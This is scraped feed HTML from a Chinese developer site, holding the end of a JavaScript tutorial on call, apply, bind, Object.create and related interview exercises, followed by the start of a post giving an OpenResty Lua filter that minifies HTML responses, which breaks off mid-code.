  <span class="hljs-attr">value</span>: <span class="hljs-number">10</span>,
  <span class="hljs-attr">getValue</span>: <span class="hljs-function">() =&gt;</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">value</span>,
};

</code></pre>
<h5 data-id="heading-27">6.2 类继承(ES6+)</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ES5 继承方式</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">eat</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> eats`</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name, breed</span>) {
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>, name);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;
}
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">create</span>(<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Dog</span>;

<span class="hljs-comment">// ES6类继承</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  }

  <span class="hljs-title function_">eat</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> eats`</span>);
  }
}

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Dog</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_ inherited__">Animal</span> {
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, breed</span>) {
    <span class="hljs-variable language_">super</span>(name);
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">breed</span> = breed;
  }

  <span class="hljs-title function_">bark</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span> barks`</span>);
  }
}

</code></pre>
<h5 data-id="heading-28">6.3 属性描述符</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 替代 Object.create 的部分功能</span>
<span class="hljs-keyword">const</span> obj = {
  <span class="hljs-comment">// 普通属性</span>
  <span class="hljs-attr">normalProp</span>: <span class="hljs-string">"value"</span>,

  <span class="hljs-comment">// 使用 getter/setter</span>
  <span class="hljs-keyword">get</span> <span class="hljs-title function_">computedProp</span>() {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">normalProp</span>.<span class="hljs-title function_">toUpperCase</span>();
  },

  <span class="hljs-keyword">set</span> <span class="hljs-title function_">computedProp</span>(<span class="hljs-params">value</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">normalProp</span> = value.<span class="hljs-title function_">toLowerCase</span>();
  },
};

<span class="hljs-comment">// 使用 Object.defineProperty 定义属性特性</span>
<span class="hljs-title class_">Object</span>.<span class="hljs-title function_">defineProperty</span>(obj, <span class="hljs-string">"readOnlyProp"</span>, {
  <span class="hljs-attr">value</span>: <span class="hljs-string">"cannot change"</span>,
  <span class="hljs-attr">writable</span>: <span class="hljs-literal">false</span>,
  <span class="hljs-attr">enumerable</span>: <span class="hljs-literal">true</span>,
  <span class="hljs-attr">configurable</span>: <span class="hljs-literal">false</span>,
});
</code></pre>
<h4 data-id="heading-29">七、常见面试题解析</h4>
<h5 data-id="heading-30">7.1 手写<code>new</code>操作符</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">myNew</span>(<span class="hljs-params">Constructor, ...args</span>) {
  <span class="hljs-comment">// 1. 创建一个新对象，继承 Constructor 的原型</span>
  <span class="hljs-keyword">const</span> obj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">myCreate</span>(<span class="hljs-title class_">Constructor</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>);

  <span class="hljs-comment">// 2. 执行构造函数, 绑定 this 到新对象</span>
  <span class="hljs-keyword">const</span> result = <span class="hljs-title class_">Constructor</span>.<span class="hljs-title function_">apply</span>(obj, args);

  <span class="hljs-comment">// 3. 如果构造函数返回对象，则返回该对象; 否则返回新对象</span>
  <span class="hljs-keyword">return</span> result <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Object</span> ? result : obj;
}

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">introduce</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`I'm <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>, <span class="hljs-subst">${<span class="hljs-variable language_">this</span>.age}</span> years old.`</span>);
};

<span class="hljs-keyword">const</span> p = <span class="hljs-title function_">myNew</span>(<span class="hljs-title class_">Person</span>, <span class="hljs-string">"Tim"</span>, <span class="hljs-number">30</span>);
p.<span class="hljs-title function_">introduce</span>(); <span class="hljs-comment">// 输出: I'm Tim, 30 years old.</span>
</code></pre>
<h5 data-id="heading-31">7.2 实现深冻结对象</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">deepFreeze</span>(<span class="hljs-params">obj</span>) {
  <span class="hljs-comment">// 获取对象的所有属性名</span>
  <span class="hljs-keyword">const</span> propNames = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">getOwnPropertyNames</span>(obj);

  <span class="hljs-comment">// 冻结自身</span>
  <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>(obj);

  <span class="hljs-comment">// 递归冻结所有属性</span>
  <span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> name <span class="hljs-keyword">of</span> propNames) {
    <span class="hljs-keyword">const</span> value = obj[name];

    <span class="hljs-keyword">if</span> (value &amp;&amp; <span class="hljs-keyword">typeof</span> value === <span class="hljs-string">"object"</span>) {
      <span class="hljs-title function_">deepFreeze</span>(value);
    }
  }

  <span class="hljs-keyword">return</span> obj;
}

<span class="hljs-comment">// 使用 Object.create 创建不可变对象</span>
<span class="hljs-keyword">const</span> immutableProto = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">freeze</span>({
  <span class="hljs-title function_">method</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-string">"immutable method"</span>;
  },
});

<span class="hljs-keyword">const</span> immutableObj = <span class="hljs-title class_">Object</span>.<span class="hljs-title function_">myCreate</span>(immutableProto);

</code></pre>
<h5 data-id="heading-32">7.3 实现柯里化函数</h5>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">curry</span>(<span class="hljs-params">fn</span>) {
  <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">curried</span>(<span class="hljs-params">...args</span>) {
    <span class="hljs-keyword">if</span> (args.<span class="hljs-property">length</span> &gt;= fn.<span class="hljs-property">length</span>) {
      <span class="hljs-comment">// 参数足够，直接执行</span>
      <span class="hljs-keyword">return</span> fn.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args);
    } <span class="hljs-keyword">else</span> {
      <span class="hljs-comment">// 参数不足，返回新函数继续收集参数</span>
      <span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span> (<span class="hljs-params">...moreArgs</span>) {
        <span class="hljs-keyword">return</span> curried.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, args.<span class="hljs-title function_">concat</span>(moreArgs));
      };
    }
  };
}

<span class="hljs-comment">// 测试</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b, c</span>) {
  <span class="hljs-keyword">return</span> a + b + c;
}

<span class="hljs-keyword">const</span> curriedAdd = <span class="hljs-title function_">curry</span>(add);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">curriedAdd</span>(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)); <span class="hljs-comment">// 6</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">curriedAdd</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)(<span class="hljs-number">3</span>)); <span class="hljs-comment">// 6</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">curriedAdd</span>(<span class="hljs-number">1</span>)(<span class="hljs-number">2</span>, <span class="hljs-number">3</span>)); <span class="hljs-comment">// 6</span>
</code></pre>
<h4 data-id="heading-33">八、总结</h4>
<p>通过手写实现<code>call</code>、<code>apply</code>、<code>bind</code>和<code>Object.create</code>, 我们深入理解了 JavaScript 的核心机制:</p>
<ol>
<li><strong>执行上下文管理:</strong> <code>call</code>和<code>apply</code>让我们可以显式控制函数的<code>this</code>指向</li>
<li><strong>函数绑定与复用:</strong> <code>bind</code>创建了可复用的函数，特别适合事件处理和回调函数</li>
<li><strong>原型继承系统:</strong> <code>Object.create</code> 是JavaScript 原型继承的基础</li>
</ol>
<p>虽然现代 JavaScript 提供了箭头函数、类语法等更高级的特性，但这些底层方法仍然是理解 JavaScript 运行机制的关键。掌握它们不仅能帮助我们写出更好的代码，还能在调试和性能优化时提供更多思路。</p>
<p>在实际开发中，我们应该根据具体场景选择合适的方法:</p>
<ul>
<li>需要立即执行且参数明确时,使用<code>call</code></li>
<li>参数在数组中时, 使用<code>apply</code></li>
<li>需要创建可复用的函数时, 使用<code>bind</code></li>
<li>需要创建特定原型的对象时, 使用<code>Object.create</code></li>
</ul>
<p>理解这些方法的底层原理，将使我们成为一名更优秀的 JavaScript 开发者。</p>
<hr/>
<p>拓展阅读建议:</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FFunction%2Fcall" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/call" ref="nofollow noopener noreferrer">MDN: Function.prototype.call()</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FFunction%2Fapply" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/apply" ref="nofollow noopener noreferrer">MDN: Function.prototype.apply()</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FFunction%2Fbind" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Function/bind" ref="nofollow noopener noreferrer">MDN: Function.prototype.bind()</a></li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fdeveloper.mozilla.org%2Fzh-CN%2Fdocs%2FWeb%2FJavaScript%2FReference%2FGlobal_Objects%2FObject%2Fcreate" target="_blank" title="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object/create" ref="nofollow noopener noreferrer">MDN: Object.create()</a></li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[原创Lua脚本压缩HTML网页源码，节省60%流量和带宽，找老板加薪]]></title>    <link>https://juejin.cn/post/7579819594270883878</link>    <guid>https://juejin.cn/post/7579819594270883878</guid>    <pubDate>2025-12-04T09:22:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7579819594270883878" data-draft-id="7579814711852924938" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="原创Lua脚本压缩HTML网页源码，节省60%流量和带宽，找老板加薪"/> <meta itemprop="keywords" content="Lua"/> <meta itemprop="datePublished" content="2025-12-04T09:22:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="卫凯"/> <meta itemprop="url" content="https://juejin.cn/user/2049145406489016"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            原创Lua脚本压缩HTML网页源码，节省60%流量和带宽，找老板加薪
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2049145406489016/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    卫凯
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-04T09:22:31.000Z" title="Thu Dec 04 2025 09:22:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-04
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>传统网站因为要注重SEO和速度，一般采用 php/java + 模板的方式开发（不会采用SPA单页模式），
特别是经过多次改版调整后，网页源码中很多无关的备注内容，占用了不少的带宽。</p>
<p>但是经过本Lua代码自动处理后，把空格，单行、多行备注，在输出到客户端前通通清理掉，不影响源码的备注，因此该技术还是有一定的场景。</p>
<p>经我测试，压缩后了只有压缩前的60%。</p>
<pre><code class="hljs language-lua" lang="lua">    <span class="hljs-keyword">local</span> outarr = {};
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">strCompress</span><span class="hljs-params">(htm)</span></span>
       <span class="hljs-keyword">if</span> htm==<span class="hljs-literal">nil</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-keyword">end</span>
       <span class="hljs-keyword">local</span> pt={
         {<span class="hljs-string">[[\/\*(.|\r|\n)*?\*\/]]</span>,<span class="hljs-string">""</span>,<span class="hljs-string">"i"</span>, <span class="hljs-string">"CSS/JS多行:/*多行注释*/"</span>},
         {<span class="hljs-string">[[&lt;![-]{2}(.|\r|\n)*?[-]{2}&gt;]]</span>,<span class="hljs-string">''</span>,<span class="hljs-string">"i"</span>, <span class="hljs-string">"HTML注释:&lt;!--注释--&gt;"</span>},
         {<span class="hljs-string">[[[\n\r\t]+]]</span>,<span class="hljs-string">" "</span>,<span class="hljs-string">"i"</span>,<span class="hljs-string">"多个换行缩进换成1个空格"</span>},
         {<span class="hljs-string">[[\s*(&lt;[\/]*(ul|li|div)&gt;)]]</span>,<span class="hljs-string">"$1"</span>,<span class="hljs-string">"i"</span>,<span class="hljs-string">"去ul,li,div前后空格"</span>},
         {<span class="hljs-string">[[((style|alt|title|class)=[\"\']\s*[\"\'])]]</span>,<span class="hljs-string">""</span>,<span class="hljs-string">"i"</span>,<span class="hljs-string">"去空alt  class"</span>},
         {<span class="hljs-string">[[\s{2,}]]</span>,<span class="hljs-string">' '</span>,<span class="hljs-string">"i"</span>,<span class="hljs-string">"连续2个空格换成1个"</span>},
         {<span class="hljs-string">[[(^\s*\/\/.*$)]]</span>,<span class="hljs-string">''</span>,<span class="hljs-string">"im"</span>,<span class="hljs-string">"前空格的双斜杠整行注释"</span>},
    	 {<span class="hljs-string">[[(?&lt;![\n\'\"\:])(\/\/[^\"\'\n]*)(?=[\n])]]</span>,<span class="hljs-string">''</span>,<span class="hljs-string">"im"</span>,<span class="hljs-string">"代码后双斜杠注释"</span>},
         {<span class="hljs-string">[[^\s{1,}]]</span>,<span class="hljs-string">''</span>,<span class="hljs-string">"im"</span>,<span class="hljs-string">"去行开始的空格"</span>},
         {<span class="hljs-string">[[(\}|\{|\(|,|:|;)(\s|\n)*]]</span>,<span class="hljs-string">'$1'</span>,<span class="hljs-string">"is"</span>,<span class="hljs-string">"大括号,左括号,逗号,分号后面的空白"</span>},
         {<span class="hljs-string">[[(\s|\n)*(\}.*$)]]</span>,<span class="hljs-string">'$2'</span>,<span class="hljs-string">"im"</span>,<span class="hljs-string">"跨行右大括号 左边的空白"</span>},
         {<span class="hljs-string">[[\)\s*\{]]</span>,<span class="hljs-string">'){'</span>,<span class="hljs-string">"im"</span>,<span class="hljs-string">"同行 右括号_左大括号中间空白"</span>},
          {<span class="hljs-string">[[\}if]]</span>,<span class="hljs-string">'};if'</span>,<span class="hljs-string">"im"</span>,<span class="hljs-string">"fix 行末不加分号后面接if"</span>}
        }
        <span class="hljs-comment">-- 选择规则顺序有讲究的，否则兼容性下降</span>
        <span class="hljs-keyword">local</span> Pats = {pt[<span class="hljs-number">1</span>],pt[<span class="hljs-number">2</span>],pt[<span class="hljs-number">3</span>],pt[<span class="hljs-number">4</span>],pt[<span class="hljs-number">5</span>],pt[<span class="hljs-number">6</span>]};
        <span class="hljs-keyword">local</span> from, to, substr = ngx.re.<span class="hljs-built_in">find</span>(htm, <span class="hljs-string">"script"</span>,<span class="hljs-string">"oj"</span>);
        <span class="hljs-keyword">if</span> from==<span class="hljs-number">2</span> <span class="hljs-keyword">then</span> 
          Pats= {pt[<span class="hljs-number">1</span>],pt[<span class="hljs-number">7</span>],pt[<span class="hljs-number">8</span>],pt[<span class="hljs-number">9</span>],pt[<span class="hljs-number">10</span>],pt[<span class="hljs-number">11</span>],pt[<span class="hljs-number">12</span>],pt[<span class="hljs-number">13</span>]}  
        <span class="hljs-keyword">end</span> 
       
        <span class="hljs-keyword">for</span> i, v <span class="hljs-keyword">in</span> <span class="hljs-built_in">pairs</span>(Pats) <span class="hljs-keyword">do</span>
          <span class="hljs-keyword">local</span> newstr = ngx.re.<span class="hljs-built_in">gsub</span>(htm, v[<span class="hljs-number">1</span>], v[<span class="hljs-number">2</span>], v[<span class="hljs-number">3</span>]);
          <span class="hljs-keyword">if</span> newstr <span class="hljs-keyword">then</span>  htm = newstr <span class="hljs-keyword">end</span>
        <span class="hljs-keyword">end</span>
        <span class="hljs-keyword">return</span> htm
     <span class="hljs-keyword">end</span>
       
     <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">split_script</span><span class="hljs-params">(a)</span></span>
          <span class="hljs-keyword">local</span> i = <span class="hljs-number">0</span>
          <span class="hljs-keyword">return</span>
          <span class="hljs-function"><span class="hljs-keyword">function</span><span class="hljs-params">( str, max)</span></span>
            <span class="hljs-keyword">if</span> leave == <span class="hljs-literal">nil</span> <span class="hljs-keyword">and</span> i==<span class="hljs-number">0</span> <span class="hljs-keyword">then</span> leave=str <span class="hljs-keyword">end</span>
            <span class="hljs-keyword">if</span> leave == <span class="hljs-literal">nil</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>  <span class="hljs-keyword">end</span>
            <span class="hljs-keyword">local</span> from,to,err = ngx.re.<span class="hljs-built_in">find</span>(leave, <span class="hljs-string">"&lt;script.*?/script&gt;"</span>, <span class="hljs-string">"sjo"</span>)
              i=i+<span class="hljs-number">1</span>
              <span class="hljs-keyword">if</span> from <span class="hljs-keyword">then</span> 
                <span class="hljs-keyword">local</span> delimiter = strCompress(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(leave,from, to))
                <span class="hljs-keyword">local</span> cutstr = strCompress(<span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(leave, <span class="hljs-number">0</span>, from<span class="hljs-number">-1</span>))
                <span class="hljs-keyword">if</span> #cutstr&gt;<span class="hljs-number">0</span> <span class="hljs-keyword">and</span> cutstr~=<span class="hljs-string">' '</span> <span class="hljs-keyword">then</span> 
                 <span class="hljs-built_in">table</span>.<span class="hljs-built_in">insert</span>(outarr, cutstr)
                <span class="hljs-keyword">end</span>
                <span class="hljs-built_in">table</span>.<span class="hljs-built_in">insert</span>(outarr, delimiter) 
                leave = <span class="hljs-built_in">string</span>.<span class="hljs-built_in">sub</span>(leave,to+<span class="hljs-number">1</span>)
                <span class="hljs-keyword">if</span> <span class="hljs-built_in">max</span>&gt;<span class="hljs-number">128</span> <span class="hljs-keyword">or</span> #leave==<span class="hljs-number">0</span> <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span> <span class="hljs-keyword">end</span>
                <span class="hljs-keyword">return</span> i,leave
              <span class="hljs-keyword">else</span>
                <span class="hljs-built_in">table</span>.<span class="hljs-built_in">insert</span>(outarr, strCompress(leave))
                <span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>
              <span class="hljs-keyword">end</span> 
          <span class="hljs-keyword">end</span> ,a,<span class="hljs-number">0</span>
     <span class="hljs-keyword">end</span>  

	<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doTraverse</span><span class="hljs-params">(str)</span></span>
		<span class="hljs-comment">-- 遍历处理</span>
		<span class="hljs-keyword">for</span> k,v <span class="hljs-keyword">in</span> split_script( str ) <span class="hljs-keyword">do</span>
	        <span class="hljs-comment">-- ngx.say(":--&gt;&gt;"..k.."&lt;&lt;--:", v )</span>
		<span class="hljs-keyword">end</span> 
	<span class="hljs-keyword">end</span>
    <span class="hljs-comment">-- 仅仅压缩html内容</span>
	<span class="hljs-keyword">local</span> i,j = ngx.re.<span class="hljs-built_in">find</span>( ngx.header[<span class="hljs-string">"Content-Type"</span>], <span class="hljs-string">"text/html"</span>,<span class="hljs-string">"sjo"</span>);
	<span class="hljs-keyword">if</span>  i ~= <span class="hljs-literal">nil</span> <span class="hljs-keyword">then</span>
	  
	    <span class="hljs-keyword">local</span> chunk, eof = ngx.<span class="hljs-built_in">arg</span>[<span class="hljs-number">1</span>], ngx.<span class="hljs-built_in">arg</span>[<span class="hljs-number">2</span>] <span class="hljs-comment">-- 获取当前的流 和是否时结束</span>
	    <span class="hljs-keyword">local</span> info = ngx.ctx.buf
	    chunk = chunk <span class="hljs-keyword">or</span> <span class="hljs-string">""</span>
	    
	    <span class="hljs-keyword">if</span> info <span class="hljs-keyword">then</span>
	        ngx.ctx.buf = info .. chunk <span class="hljs-comment">-- 这个可以将原本的内容记录下来</span>
	    <span class="hljs-keyword">else</span>
	        ngx.ctx.buf = chunk
	    <span class="hljs-keyword">end</span>
	    
	    <span class="hljs-keyword">if</span> eof <span class="hljs-keyword">then</span>
	        <span class="hljs-comment">-- ngx.ctx.buffered = nili</span>
	        <span class="hljs-keyword">if</span> <span class="hljs-built_in">status</span> == <span class="hljs-number">413</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">status</span> == <span class="hljs-string">"413"</span> <span class="hljs-keyword">then</span>  <span class="hljs-comment">-- 413是Nginx request body timeout 的状态吗</span>
			   ngx.<span class="hljs-built_in">arg</span>[<span class="hljs-number">1</span>] = <span class="hljs-string">"&lt;h1&gt;Nginx request body timeout&lt;/h1&gt;"</span>
	        <span class="hljs-keyword">else</span>
			   doTraverse( ngx.ctx.buf ) 
